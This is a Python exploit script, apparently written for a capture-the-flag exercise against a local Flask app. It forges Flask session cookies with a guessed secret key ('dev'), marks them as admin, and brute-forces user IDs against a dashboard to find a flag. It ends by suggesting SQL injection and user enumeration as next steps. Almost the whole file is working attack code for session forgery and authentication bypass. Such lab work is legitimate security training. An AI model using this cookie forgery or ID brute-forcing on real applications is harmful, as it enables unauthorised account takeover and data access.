import requests
import re
from itsdangerous import URLSafeTimedSerializer
import hashlib

# Target URL
base_url = "http://127.0.0.1:32883"
dashboard_url = f"{base_url}/dashboard"

# Working secret key
secret_key = 'dev'

def forge_flask_session(secret_key, user_id, user_type=None):
    """Forge a Flask session cookie"""
    try:
        serializer = URLSafeTimedSerializer(
            secret_key,
            salt='cookie-session',
            signer_kwargs={'key_derivation': 'hmac', 'digest_method': hashlib.sha1}
        )
        session_data = {'user_id': user_id}
        if user_type:
            session_data['user_type'] = user_type
            
        forged_cookie = serializer.dumps(session_data)
        return forged_cookie
    except Exception as e:
        print(f"[!] Error forging session: {e}")
        return None

print("[*] Exhaustively searching for valid user_id with admin dashboard")
print("[*] Strategy: Test user_ids with 'admin' user_type to see if it bypasses validation")
print("="*80)

# Try user_ids with admin user_type
test_ranges = [
    range(1, 51),          # 1-50
    range(100, 201),       # 100-200
    range(1000, 1101),     # 1000-1100
    range(10000, 10101),   # 10000-10100
]

found_flag = False
valid_user_ids = []

for test_range in test_ranges:
    if found_flag:
        break
        
    for user_id in test_range:
        # Try with admin user_type
        forged_cookie = forge_flask_session(secret_key, user_id, 'admin')
        
        if forged_cookie:
            cookies = {'session': forged_cookie}
            response = requests.get(dashboard_url, cookies=cookies, allow_redirects=False, timeout=5)
            
            # Check if it's NOT a redirect (means valid user)
            if response.status_code != 302:
                print(f"\n[+] FOUND VALID USER: user_id={user_id} with admin user_type")
                print(f"[+] Status: {response.status_code} | Length: {len(response.content)}B")
                
                valid_user_ids.append(user_id)
                
                # Look for FLAG
                flag_match = re.search(r'FLAG\{[^}]+\}', response.text)
                if flag_match:
                    print(f"[!] FLAG FOUND: {flag_match.group(0)}")
                    print(f"[+] Full Response:\n{response.text}")
                    found_flag = True
                    break
                else:
                    print(f"[+] Response:\n{response.text}")

if not found_flag and len(valid_user_ids) == 0:
    print("\n[-] No valid user_ids found with admin user_type")
    print("[*] The application validates user_id exists in database regardless of user_type")
    print("\n[*] CRITICAL INSIGHT: Need to find the actual admin user_id from database")
    print("[*] Possible approaches:")
    print("    1. Login as 'test:test' mentioned in HTML comment")
    print("    2. Use SQL injection on login form to extract admin user_id")
    print("    3. Check if there's a user enumeration vulnerability")

print(f"\n[*] Valid user_ids found: {valid_user_ids}")

